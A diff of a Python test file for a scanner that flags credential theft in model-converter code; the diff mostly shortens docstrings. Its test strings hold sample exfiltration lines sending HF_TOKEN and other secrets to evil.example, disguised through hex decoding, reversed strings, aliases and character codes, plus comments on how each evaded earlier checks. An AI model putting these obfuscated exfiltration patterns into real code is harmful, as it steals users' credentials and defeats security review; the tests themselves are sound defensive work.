@@ -3075,10 +3075,8 @@ def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
 
 def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
     """Upstream's own gguf-py/gguf/utility.py reads HF_TOKEN and sends it to
-    huggingface.co as an Authorization header, which is what downloading a gated
-    model looks like. The env-harvest rule fired on it, so
-    UNSLOTH_CONVERTER_SCAN_STRICT refused every clean checkout of llama.cpp
-    master over a file the converter genuinely imports.
+    huggingface.co as an Authorization header, which is what downloading a
+    gated model looks like.
     """
     scan_converter_source = _load(
         "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
@@ -3151,14 +3149,7 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         + 's = socket.socket()\ns.connect(("evil.example", 443))\n'
         + 's.send(os.environ["HF_TOKEN"].encode())\n',
         # http.server names no destination at all: it serves the token to
-        # whoever connects. The network rule recognises it, so leaving it out of
-        # the refusal let a handler hand HF_TOKEN to inbound clients beside a hub
-        # literal and produce no finding.
-        # A destination decoded out of a constant is one the literal walk cannot
-        # read: bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65")
-        # .decode() is "https://evil.example" with no URL anywhere in the source.
-        # Folding every such primitive would mean an evaluator; refusing them
-        # costs nothing, since the real packages use none of them.
+        # whoever connects.
         'import os\nimport requests\n' + hub
         + 'url = bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65").decode()\n'
         + 'requests.get(url + os.environ["HF_TOKEN"])\n',
@@ -3213,8 +3204,7 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
 
     # Decoding what came BACK is upstream's own shape and must not be refused:
     # gguf-py/gguf/utility.py reads metadata_bytes.decode("utf-8") off the
-    # download. The refusals above are for building a destination, not reading a
-    # response.
+    # download.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'r = requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
@@ -3225,9 +3215,7 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
 def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     """The hub is writable and multi-tenant, so "the destination is the hub" is
     not on its own a reason to say nothing: a token with write scope can create
-    a public repository there and make it a channel anyone can read back. The
-    allowance is for the shape upstream actually has, a token-authenticated
-    download, and refuses everything else.
+    a public repository there and make it a channel anyone can read back.
     """
     scan_converter_source = _load(
         "converter_scan_shape_probe", "unsloth_zoo/converter_scan.py",
@@ -3246,9 +3234,8 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     # A secret that is not the hub's own token has no business going there, and
     # that is every name, not the ones that look secret: filtering on keywords
     # let GITHUB_PAT through, because "PAT" is not one of them, so a file
-    # reading HF_TOKEN and GITHUB_PAT and sending the second to the hub produced
-    # no finding at all. Nothing here can tell a credential from a setting by
-    # its name, so the allowance covers the hub's own token and nothing else.
+    # reading HF_TOKEN and GITHUB_PAT and sending the second to the hub
+    # produced no finding at all.
     assert _findings(
         'requests.get(HUB, headers = {"a": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
     )
@@ -3269,9 +3256,7 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     assert _findings(
         'requests.get(HUB, headers = {"a": os.environ["HUGGING_FACE_HUB_TOKEN"]})\n'
     ) == []
-    # Nor does the whole environment. Tested BESIDE a legitimate hub token,
-    # because a bare dict(os.environ) names nothing and is already refused for
-    # that reason: it is the combination that needs the whole-environment check.
+    # Nor does the whole environment.
     assert _findings('requests.get(HUB, params = dict(os.environ))\n')
     assert _findings(
         'requests.get(\n'
@@ -3312,10 +3297,8 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
         'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
         'requests.get(HUB, headers = {"a": os.environ.get(SECRET)})\n'
     )
-    # A dynamic read BESIDE a legitimate hub token: the collected names are then
-    # exactly the hub's own, so only the dynamic check refuses this. Without a
-    # case like it, the empty-set check covers for it and either can be removed
-    # with every test still passing.
+    # A dynamic read BESIDE a legitimate hub token: the collected names are
+    # then exactly the hub's own, so only the dynamic check refuses this.
     assert _findings(
         'requests.get(HUB, headers = {\n'
         '    "Authorization": os.environ["HF_TOKEN"],\n'
@@ -3375,17 +3358,13 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     )
 
     # And when the collected set is genuinely EMPTY: os.environ reached through
-    # a call this does not read, with the rule firing on the comment. An empty
-    # set satisfies the subset check on its own, so without the emptiness test
-    # this is allowed.
+    # a call this does not read, with the rule firing on the comment.
     assert _findings(
         'os.environ.setdefault("HF_HOME", "/tmp")  # TOKEN\n'
         'requests.get(HUB)\n'
     )
 
-    # And only os.environ counts as the environment. Any object's .get() did,
-    # so an ordinary config.get("API_KEY") beside a normal hub download read as
-    # an environment secret and put the false positive straight back.
+    # And only os.environ counts as the environment.
     assert _findings(
         'config = {}\n'
         'k = config.get("API_KEY")\n'
@@ -3405,18 +3384,7 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
 
 
 def test_a_write_or_an_environment_read_under_another_name_refuses_it():
-    """One rename was enough to walk past both checks.
-
-    `post = requests.post` leaves the call site an ast.Name, so the write check,
-    which read attributes, saw no write and a POST of HF_TOKEN to the hub was
-    suppressed. `getenv = os.getenv` and `from os import environ` do the same to
-    the environment read: the secret it takes never enters the collected set, so
-    the set holds the hub token alone and satisfies the allow-list.
-
-    Following an alias means following assignment through every shape. Naming
-    one at all is enough to refuse, and none of these names appears in any
-    position in the 21 real gguf-py and converter modules.
-    """
+    """One rename was enough to walk past both checks."""
     scan_converter_source = _load(
         "converter_scan_alias_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3444,8 +3412,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": e["AWS_SECRET_ACCESS_KEY"]})\n',
         # An alias keeps no reserved spelling, so the name it lands under says
-        # nothing. An os.getenv that is not called right here is one going
-        # somewhere this does not follow.
+        # nothing.
         'import os\nimport requests\n' + hub
         + 'read_secret = os.getenv\n'
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
@@ -3475,8 +3442,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'f = vars(requests)["po" + "st"]\n'
         + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
         # A module dictionary leaves the method name as a string and nothing
-        # else. None of these names appears as a string constant anywhere in
-        # the 21 real modules either.
+        # else.
         'import os\nimport requests\n' + hub
         + 'requests.get(HUB)\n'
         + 'f = vars(requests)["post"]\n'
@@ -3492,8 +3458,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'f("https://huggingface.co/api/repos/create",'
         + ' data = os.environ["HF_TOKEN"])\n',
         # And a computed name on one of these modules is a lookup this cannot
-        # read at all. Upstream calls getattr with a computed name nine times,
-        # every one of them on its own objects, so those stay readable.
+        # read at all.
         'import os\nimport requests\n' + hub
         + 'name = "environ"\n'
         + 'env = getattr(os, name)\n'
@@ -3506,8 +3471,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         ), body
 
     # os.environ and os.getenv are attributes, not bare names, and upstream's
-    # own shape reads both. It must still pass, and os.getenv CALLED here is
-    # not an alias of anything.
+    # own shape reads both.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'headers = {}\n'
@@ -3521,8 +3485,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
     ) == []
 
-    # The key can be a keyword. Calling that dynamic refused a legitimate
-    # download, which is the false positive this narrowing exists to remove.
+    # The key can be a keyword.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'if os.environ.get(key = "HF_TOKEN"):\n'
@@ -3549,13 +3512,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
 
 def test_an_oversized_join_is_not_folded():
     """A join multiplies, unlike + and %, whose result is bounded by the source
-    that spells it. A 100 KB separator with 10000 elements is 130 KB of source
-    and a 1 GB string: measured at 15.7 seconds and 1.7 GB resident inside the
-    decision about whether an export may run.
-
-    Over the ceiling the join is simply not folded, which is safe in the other
-    direction too: the walk then reads the separator and the elements
-    individually, so a destination hidden in one is still seen.
+    that spells it.
     """
     module = _load("converter_scan_join_size_probe", "unsloth_zoo/converter_scan.py")
     separator = "A" * 100_000
@@ -3582,9 +3539,6 @@ def test_an_oversized_join_is_not_folded():
     ], "an oversized join must not hide the literals inside it"
 
     # A NESTED spec is why the fields are parsed rather than pattern-matched:
-    # "{0:{1}}".format("x", "10000000000") has one, character classes cannot
-    # span the inner braces, the length estimate stays tiny, and formatting it
-    # took 8.5 seconds and ten gigabytes.
     started = time.perf_counter()
     module.scan_converter_source(
         preamble
@@ -3629,19 +3583,9 @@ def test_an_oversized_join_is_not_folded():
 
 
 def test_nothing_in_the_allowance_may_raise():
-    """A scanner exception is an evasion, not an error.
-
-    The walks recurse through nested expressions, and about 600 operands in one
-    addition exhausts the default limit. scan_converter_source does not catch
-    that and warn_on_suspicious_converter catches everything and CONTINUES, so a
-    payload could append one long expression to itself and have the entire scan
-    report nothing, in strict mode included.
-    """
+    """A scanner exception is an evasion, not an error."""
     module = _load("converter_scan_raise_probe", "unsloth_zoo/converter_scan.py")
-    # An expression that need never run: "{0[x]}".format("a") raises TypeError
-    # out of the folding. It has to sit in a file that REACHES the folding, so
-    # the reads here are the hub's own token and the only host is the hub;
-    # anything else refuses earlier and the poison is never evaluated.
+    # An expression that need never run:
     poisoned = (
         'import os\n'
         'import requests\n'
@@ -3667,12 +3611,7 @@ def test_nothing_in_the_allowance_may_raise():
 
 def test_a_documentation_url_in_a_docstring_is_not_a_destination():
     """Comments never reach the literal walk, since it reads the AST, so
-    upstream's `# Reference: https://github.com/...` costs nothing. A docstring
-    saying the same thing IS a Constant, and counting it as a destination
-    refuses a clean hub-only converter over a link in its own documentation.
-
-    Unless the file reads __doc__, which makes the docstring reachable as a
-    value and the argument above stop holding.
+    upstream's `# Reference: https://github.com/...` costs nothing.
     """
     scan_converter_source = _load(
         "converter_scan_docstring_probe", "unsloth_zoo/converter_scan.py",
@@ -3696,8 +3635,7 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
         '    return requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
     ) == []
 
-    # The word in a comment is not a read. Taking it for one put the false
-    # positive straight back, on a file whose only sin was mentioning __doc__.
+    # The word in a comment is not a read.
     assert scan_converter_source(
         '"""See https://github.com/ggml-org/llama.cpp for details."""\n'
         'import os\n'
@@ -3810,12 +3748,8 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
 
 
 def test_urllib_refuses_the_hub_allowance():
-    """urllib expresses a write as Request(..., data = ...), Request(...,
-    method = "POST") or urlopen(..., data = ...). None of those is an attribute
-    called post, so the write check cannot see them, and a request sending
-    HF_TOKEN to a writable hub endpoint kept its allowance. urllib appears
-    nowhere in the real gguf-py or conversion packages, so refusing on it costs
-    nothing upstream.
+    """urllib expresses a write as Request(..., data = ...), Request(..., method =
+    "POST") or urlopen(..., data = ...).
     """
     scan_converter_source = _load(
         "converter_scan_urllib_probe", "unsloth_zoo/converter_scan.py",
@@ -3839,15 +3773,6 @@ def test_urllib_refuses_the_hub_allowance():
 def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
     """Three spellings the readable-name checks could not see, because the only
     place the name appears is the import line.
-
-    `from base64 import b64decode as d` leaves the call as d(...), which the
-    qualified decoder pattern does not match; `from inspect import getdoc as g`
-    leaves g(fetch), which is neither a Name nor an Attribute the docstring
-    check reads; and "{p[s]}://{p[h]}".format(p = parts) spells its own scheme
-    out of a field, which the format fold declined to read at all rather than
-    leaving a hole in. Each one sent HF_TOKEN to an attacker host while an
-    unused hub literal granted the allowance. Upstream imports none of these
-    modules and builds no URL with .format, so refusing costs nothing there.
     """
     scan_converter_source = _load(
         "converter_scan_import_alias_probe", "unsloth_zoo/converter_scan.py",
@@ -3898,18 +3823,7 @@ def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
 
 
 def test_a_constant_rewritten_into_a_url_refuses_it():
-    """A scheme that does not exist until a method call runs.
-
-    "httpsX//evil.example/c".replace("X", ":") holds no scheme for the walk to
-    find, and the reshape rule watched names that carry a URL rather than
-    literals that become one, so the hub literal beside it granted the
-    allowance. A rewrite whose arguments can be read is folded and the real
-    destination is read; one whose arguments cannot is refused.
-
-    Upstream is untouched: every .replace() in gguf-py/gguf/utility.py rewrites
-    a parameter, never a constant, and appending a path to the hub URL is what
-    it does for real.
-    """
+    """A scheme that does not exist until a method call runs."""
     scan_converter_source = _load(
         "converter_scan_rewrite_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3928,8 +3842,7 @@ def test_a_constant_rewritten_into_a_url_refuses_it():
         ], body
 
     # Appending a path to the hub, in the shape a chain of appends really
-    # parses in: (HUB + "/api/") + name, where the delimiter that ended the
-    # authority sits inside the left operand rather than beside it.
+    # parses in:
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'name = base.strip().replace(" ", "-").replace("/", "-")\n'
@@ -3946,16 +3859,7 @@ def test_a_constant_rewritten_into_a_url_refuses_it():
 
 def test_percent_formatting_is_read_whichever_way_it_is_written():
     """The operator takes a mapping as well as a tuple, and only the tuple was
-    folded. "%(scheme)s://%(host)s/c" % {"scheme": "https", "host":
-    "evil.example"} is a whole URL where neither half is a destination on its
-    own, so the walk saw only the hub literal beside it.
-
-    An operand this cannot read now leaves a hole rather than erasing the
-    template, which is what the join and the f-string already did: "%s://%s" %
-    (scheme, host) spells its own scheme out of one, and refusing a scheme that
-    comes out of a hole catches both. The same hole keeps honest code readable,
-    since "/api/models/%s" % name appended to the hub URL was text the authority
-    check could not read either.
+    folded.
     """
     scan_converter_source = _load(
         "converter_scan_percent_probe", "unsloth_zoo/converter_scan.py",
@@ -4001,18 +3905,7 @@ def test_percent_formatting_is_read_whichever_way_it_is_written():
 
 
 def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
-    """No literal in the file is a URL at all.
-
-    scheme = "https"; separator = "://"; host = "evil.example" assembles a
-    destination that nothing spelled, and every rule here reads literals, so
-    the only host recorded was an unused hub literal beside it. A name bound
-    exactly once to text that folds is now read as that text, which puts the
-    assembled URL back in front of the walk.
-
-    Substituting a value a name demonstrably has is not the same as guessing:
-    a name bound twice is left alone, and a hub URL assembled this way is still
-    the hub.
-    """
+    """No literal in the file is a URL at all."""
     scan_converter_source = _load(
         "converter_scan_inline_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4058,9 +3951,7 @@ def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
         + 'url = scheme + separator + host\n' + send
     ) == []
     # A name bound more than once holds no one value, so it stays a hole and
-    # the destination stays unreadable. Reading the LAST binding instead would
-    # be a guess, and the request here is sent before it: the file fetches
-    # evil.example and rebinds the name to the hub afterwards.
+    # the destination stays unreadable.
     assert [
         f.check for f in scan_converter_source(
             'import os\nimport requests\n'
@@ -4072,10 +3963,8 @@ def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
 
 
 def test_percent_formatting_is_bounded_before_it_runs():
-    """The aggregate budget is spent on what the walk reads, and the operator
-    runs before that. A thousand %(x)s fields and a 50 KB value build 50 MB out
-    of a 53 KB source, and both factors scale inside the 8 MiB the scan accepts,
-    so the size is estimated before the formatting rather than after it.
+    """The aggregate budget is spent on what the walk reads, and the operator runs
+    before that.
     """
     module = _load(
         "converter_scan_percent_bound_probe", "unsloth_zoo/converter_scan.py",
@@ -4104,12 +3993,7 @@ def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
     """A carrier does not survive a call, on purpose: upstream writes
     cls.get_list_tensors(url).items() and response = requests.get(url), and
     tracking what came back out of those refused the very file this allowance
-    exists for. Wrapping the hub URL in an object first used that: httpx.URL(
-    HUB).copy_with(host = "evil.example") sends the token to evil.example while
-    every literal in the file is still the hub.
-
-    So the receiver is searched for a carrier when, and only when, the method is
-    one that rebuilds a URL. None of upstream's calls on a URL is one.
+    exists for.
     """
     scan_converter_source = _load(
         "converter_scan_wrapper_probe", "unsloth_zoo/converter_scan.py",
@@ -4143,18 +4027,7 @@ def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
 
 
 def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
-    """Two more spellings of the same rewrite.
-
-    `from urllib.parse import urljoin as j` leaves the call spelled j(...), and
-    comparing the call site against a set of names missed it exactly as the
-    decoder and docstring checks missed their own aliases, so imports are read
-    for what they bind. And a parse result assembles a whole destination out of
-    fields with no URL literal anywhere: ParseResult("https", "evil.example",
-    "/c", "", "", "").geturl() names no host the walk can see.
-
-    Upstream reads .scheme and .netloc off a parse result and never calls
-    geturl, and it imports nothing under an alias.
-    """
+    """Two more spellings of the same rewrite."""
     scan_converter_source = _load(
         "converter_scan_alias_builder_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4187,14 +4060,7 @@ def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
 
 
 def test_inlining_a_constant_is_charged_per_use():
-    """The budget is on what the substitution materialises, not on the name.
-
-    One 50 KB constant loaded a hundred times is five megabytes of text out of
-    a 49 KB file, and charging it once let the folds grow prefixes of that at
-    every level: six seconds on a file the scan accepts at up to 8 MiB. A fold
-    that would pass the ceiling is left unread instead, which is what the join
-    and the formatting already do.
-    """
+    """The budget is on what the substitution materialises, not on the name."""
     module = _load(
         "converter_scan_inline_budget_probe", "unsloth_zoo/converter_scan.py",
     )
@@ -4255,14 +4121,7 @@ def test_inlining_a_constant_is_charged_per_use():
 
 def test_a_destination_spelled_in_character_codes_refuses_it():
     """bytearray([104, 116, 116, 112, 115]).decode() is a URL with no URL in it,
-    and so is "".join(chr(c) for c in codes). The obfuscation rule this scan
-    already had wants exec or eval beside it, which none of these needs: the
-    destination is simply spelled in numbers.
-
-    Narrow at the receiver, because the one upstream file this allowance
-    reaches really does write bytearray(get_data_by_range(...)): only a
-    container written out in the source counts, never bytes that came back from
-    a call.
+    and so is "".join(chr(c) for c in codes).
     """
     scan_converter_source = _load(
         "converter_scan_codes_probe", "unsloth_zoo/converter_scan.py",
@@ -4289,16 +4148,9 @@ def test_a_destination_spelled_in_character_codes_refuses_it():
 
 
 def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
-    """"c/tcelloc/elpmaxe.live//:sptth"[::-1] is a whole URL written backwards,
-    so nothing matched a scheme and the hub literal beside it granted the
-    allowance. Subscripting a NAME that carries a URL was already refused, and
-    a literal that becomes one only when it is sliced is the same reshape with
-    the text written out.
-
-    A template is checked by length before anything parses it: Formatter().parse
-    turns a megabyte of repeated {} into half a million tuples, out of a file
-    the scan accepts at up to 8 MiB, and no converter writes a 64 KiB format
-    string.
+    """"c/tcelloc/elpmaxe.live//:sptth"[::-1] is a whole URL written backwards, so
+    nothing matched a scheme and the hub literal beside it granted the
+    allowance.
     """
     module = _load(
         "converter_scan_slice_probe", "unsloth_zoo/converter_scan.py",
@@ -4346,15 +4198,8 @@ def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
 
 def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
     """`j = urljoin` rebinds the builder with no import in sight, so following
-    import aliases was not enough: a single assignment of one name to another is
-    followed the same way.
-
-    And the folding itself is budgeted, not only its results. Each fold carries
-    an output ceiling and the destination walk charges what it reads, but the
-    folding happens in several places and the carrier fixpoint alone reads every
-    assignment up to sixteen times: two hundred joins of a megabyte apiece sit
-    inside every individual ceiling and are still hundreds of megabytes of work.
-    Running out refuses, since folding is how this reads a destination at all.
+    import aliases was not enough: a single assignment of one name to another
+    is followed the same way.
     """
     module = _load(
         "converter_scan_rebind_probe", "unsloth_zoo/converter_scan.py",
@@ -4372,8 +4217,7 @@ def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
 
     # The budget is on the folding, so it is asserted on the folding rather
     # than on a clock: every fold is charged as it is produced, and a decision
-    # that runs out raises rather than carrying on. Timing this instead failed
-    # on loaded workers while the scanner was behaving, twice.
+    # that runs out raises rather than carrying on.
     import ast as ast_module
     module._fold_state.budget = 1_000
     try:
@@ -4401,14 +4245,8 @@ def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
 
 
 def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
-    """"".join(x for x in ("https", "://evil.example/c")) is a whole URL, and
-    the walk sees two pieces neither of which carries a scheme. Only a sequence
-    written out is folded, and returning no text for anything else left the
-    destination unnamed rather than unreadable.
-
-    One argument, which leaves os.path.join(a, b) alone, and a sequence written
-    out is still folded, which is the shape a converter would actually use. No file that reaches this allowance joins anything:
-    gguf-py/gguf/utility.py has no .join at all.
+    """"".join(x for x in ("https", "://evil.example/c")) is a whole URL, and the
+    walk sees two pieces neither of which carries a scheme.
     """
     scan_converter_source = _load(
         "converter_scan_join_probe", "unsloth_zoo/converter_scan.py",
@@ -4445,11 +4283,9 @@ def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
 
 
 def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
-    """"https" * 1 + "://evil.example/c" carries its scheme in a repetition,
-    which was neither folded nor refused, so no literal in the file held a URL
-    at all. Either operand may be the count, a count this cannot read leaves a
-    hole the way an unreadable f-string piece does, and the product carries the
-    ceiling every other fold carries.
+    """"https" * 1 + "://evil.example/c" carries its scheme in a repetition, which
+    was neither folded nor refused, so no literal in the file held a URL at
+    all.
     """
     module = _load(
         "converter_scan_repeat_probe", "unsloth_zoo/converter_scan.py",
@@ -4466,8 +4302,7 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
 
     # A reducer applies the same plus pairwise, which no fold can follow:
     # functools.reduce(operator.add, ["https", "://evil.example/c"]) builds a
-    # URL out of pieces this reads one at a time. No file in llama.cpp imports
-    # functools at all.
+    # URL out of pieces this reads one at a time.
     for body in (
         'import functools, operator\n'
         'url = functools.reduce(operator.add, ["https", "://evil.example/c"])\n'
@@ -4499,13 +4334,10 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
 
 
 def test_a_string_method_called_unbound_is_still_that_method():
-    """Called unbound, the receiver is the type rather than the template, so
-    every rule that reads a receiver saw str and the template went past as an
+    """Called unbound, the receiver is the type rather than the template, so every
+    rule that reads a receiver saw str and the template went past as an
     ordinary argument: str.format("{}://{}", "https", "evil.example/c") named
     no destination at all, and str.replace and str.join did the same.
-
-    The call is rewritten to its bound form once, before anything reads it, so
-    the folds and the refusals stay written one way.
     """
     scan_converter_source = _load(
         "converter_scan_unbound_probe", "unsloth_zoo/converter_scan.py",
@@ -4530,9 +4362,6 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
     "evil.example").sendmail(..., os.environ["HF_TOKEN"]) makes both original
     predicates true, and no walk over the literals can say where it sends,
     because its destination is a bare host rather than a URL.
-
-    requests, httpx and aiohttp are deliberately not on that list: they take a
-    URL, which this reads.
     """
     scan_converter_source = _load(
         "converter_scan_client_probe", "unsloth_zoo/converter_scan.py",
@@ -4548,8 +4377,7 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
         ' os.environ["HF_TOKEN"].encode())\n',
         'from websockets import connect as c\nc("wss://evil.example")\n',
         # The member counts with its parent: from http import client is
-        # http.client, and reading the module alone saw only "http". None of
-        # putrequest, putheader or endheaders is a write this rule knows.
+        # http.client, and reading the module alone saw only "http".
         'from http import client\n'
         'c = client.HTTPSConnection("evil.example")\n'
         'c.putrequest("GET", "/")\n'
@@ -4582,14 +4410,7 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
 
 
 def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
-    """Two ways a binding happens with no line that looks like one.
-
-    __import__("smtplib") and importlib.import_module("smtplib") bind a module
-    with no Import node anywhere, so every check that reads the import lines
-    saw nothing at all, and a name this cannot read is worse than a known one.
-    A match case captures into a name the same way an assignment does, so a
-    name a pattern rebinds is not one value and must never be substituted for.
-    """
+    """Two ways a binding happens with no line that looks like one."""
     module = _load(
         "converter_scan_dynamic_probe", "unsloth_zoo/converter_scan.py",
     )
@@ -4622,8 +4443,7 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
         ], body
 
     # And a computed lookup leaves the importer as a string and nothing else,
-    # exactly as the write methods and the environment names did. Neither name
-    # appears as a string constant in the 21 real modules.
+    # exactly as the write methods and the environment names did.
     for body in (
         'import builtins\n'
         'builtins.__dict__["__import__"]("smtplib").SMTP("evil.example")\n',
@@ -4656,13 +4476,7 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
 
 
 def test_the_allowance_runs_where_the_match_statement_does_not_exist():
-    """The package supports Python 3.9, where ast.MatchAs does not exist.
-
-    Reaching for it per node raised AttributeError there, the allowance caught
-    it and refused, and the honest converter produced a CRITICAL finding on 3.9
-    alone. The classes are named once at import instead, and isinstance against
-    an empty tuple is simply False.
-    """
+    """The package supports Python 3.9, where ast.MatchAs does not exist."""
     import ast as ast_module
 
     removed = {}
@@ -4686,10 +4500,9 @@ def test_the_allowance_runs_where_the_match_statement_does_not_exist():
 
 
 def test_a_descriptor_bound_to_a_name_is_still_that_method():
-    """r = str.replace then r(HUB, "huggingface.co", "evil.example") is the
-    same rewrite with the method behind a name, which no rule that reads a call
-    site could see. A single assignment of a descriptor is followed the way an
-    import alias is.
+    """r = str.replace then r(HUB, "huggingface.co", "evil.example") is the same
+    rewrite with the method behind a name, which no rule that reads a call site
+    could see.
     """
     scan_converter_source = _load(
         "converter_scan_descriptor_alias_probe", "unsloth_zoo/converter_scan.py",
@@ -4708,13 +4521,9 @@ def test_a_descriptor_bound_to_a_name_is_still_that_method():
 
 
 def test_a_bytes_environment_read_and_a_called_plus_are_read():
-    """os.getenvb(b"AWS_SECRET_ACCESS_KEY") is the same read as os.getenv on
-    Unix, and exempting it left the collected set holding the hub token alone
-    while a hub GET carried both values.
-
-    operator.add("https", "://evil.example/c") and "https".__add__(...) build
-    the same string the operator does, and reading only the operator left
-    neither literal holding a URL.
+    """os.getenvb(b"AWS_SECRET_ACCESS_KEY") is the same read as os.getenv on Unix,
+    and exempting it left the collected set holding the hub token alone while a
+    hub GET carried both values.
     """
     module = _load(
         "converter_scan_getenvb_probe", "unsloth_zoo/converter_scan.py",
@@ -4781,13 +4590,8 @@ def test_a_bytes_environment_read_and_a_called_plus_are_read():
 
 
 def test_two_scans_at_once_do_not_share_one_budget():
-    """The fold budget was a module global, so two exports running at once
-    charged the same counter and the first to finish cleared it under the
-    second. A clean converter could then be refused for text another thread
-    folded, which is a CRITICAL finding and a blocked export in strict mode.
-
-    Asserted on the state rather than on a race: a scan running on another
-    thread must leave this thread's budget exactly as it found it.
+    """The fold budget was a module global, so two exports running at once charged
+    the same counter and the first to finish cleared it under the second.
     """
     import threading
 
@@ -4822,15 +4626,9 @@ def test_two_scans_at_once_do_not_share_one_budget():
 
 
 def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
-    """Bytes holding UTF-16 for an attacker URL are read here as UTF-8
-    replacement text, so nothing in the file spelled a host, and decoding a
-    literal is now refused outright. Upstream decodes what came back from the
-    hub, which is not a literal.
-
-    A hole immediately before :// was not the only way to hide a scheme
-    either: "%cttps://evil.example/c" supplies one character of it, and the
-    whole scheme is read back from the separator now rather than the character
-    before it.
+    """Bytes holding UTF-16 for an attacker URL are read here as UTF-8 replacement
+    text, so nothing in the file spelled a host, and decoding a literal is now
+    refused outright.
     """
     scan_converter_source = _load(
         "converter_scan_decode_probe", "unsloth_zoo/converter_scan.py",
@@ -4847,8 +4645,6 @@ def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
     # And a literal taken apart is put back together the same way:
-    # "https|://evil.example/c".split("|") indexed and joined is a whole URL
-    # out of pieces that come from a call.
     for body in (
         'parts = "https|://evil.example/c".split("|")\n'
         'url = parts[0] + parts[1]\n' + send,
@@ -4872,15 +4668,9 @@ def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
 
 
 def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
-    """Named methods were losing one at a time: replace with dynamic
-    arguments, decode of UTF-16 bytes, split indexed back together, and then
-    "https".ljust(6, ":") turning a word into a scheme. The tail has no end, so
-    the rule asks the other question. The receiver is a literal, the result is
-    not readable, and a transformation this cannot follow is not one it can
-    vouch for.
-
-    What the folds do read stays readable, which is what keeps upstream
-    working: it transforms parameters, never constants.
+    """Named methods were losing one at a time: replace with dynamic arguments,
+    decode of UTF-16 bytes, split indexed back together, and then
+    "https".ljust(6, ":") turning a word into a scheme.
     """
     scan_converter_source = _load(
         "converter_scan_any_method_probe", "unsloth_zoo/converter_scan.py",
@@ -4914,9 +4704,7 @@ def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
 
 def test_a_token_sent_over_plaintext_refuses_the_hub_allowance():
     """The host is the hub and the scheme is http, so the credential goes out
-    where anyone on the path can read it. The allowance exists to say nothing
-    about an ordinary authenticated download, and this is not one: upstream's
-    BASE_DOMAIN is https and so is every URL it builds.
+    where anyone on the path can read it.
     """
     scan_converter_source = _load(
         "converter_scan_plaintext_probe", "unsloth_zoo/converter_scan.py",
@@ -4936,9 +4724,7 @@ def test_a_token_sent_over_plaintext_refuses_the_hub_allowance():
 
 
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
-    """Only the env-harvest combination is narrowed. A credential stealer or a
